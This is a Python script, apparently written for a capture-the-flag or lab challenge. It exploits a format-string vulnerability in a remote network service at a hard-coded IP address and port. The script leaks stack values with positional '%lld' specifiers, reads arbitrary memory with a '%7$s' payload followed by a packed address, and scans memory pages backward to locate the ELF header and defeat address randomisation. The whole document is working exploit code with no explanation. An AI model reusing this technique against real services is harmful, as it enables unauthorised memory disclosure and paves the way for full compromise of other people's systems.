#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.12)
    try: return s.recv(4096)
    except Exception as e: return b'<T:'+str(e).encode()
def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(X):
    fmt = b"%7$s" + b"AAAA" + struct.pack("<Q", X)
    return ask(fmt)

a15 = leak_lld(15)
a4 = leak_lld(4)
print("a15=",hex(a15&((1<<64)-1)), "a4=",hex(a4&((1<<64)-1)))
# walk down from a15 page to find ELF magic
start = (a15 & ~0xfff)
for delta in range(0, 0x20000, 0x1000):
    X = start - delta
    r = readmem(X)
    if b'\x7fELF' in r or r.startswith(b'\x7fELF'):
        print("FOUND ELF at", hex(X), repr(r[:40]))
        break
    if X < 0x5aab00000000:
        break
    if delta % 0x10000 == 0:
        print("  ...", hex(X))
# also check a4's region base
start4 = (a4 & ~0xfff)
for delta in range(0, 0x10000, 0x1000):
    X = start4 - delta
    r = readmem(X)
    if r.startswith(b'\x7fELF'):
        print("FOUND ELF (a4) at", hex(X))
        break
s.close()
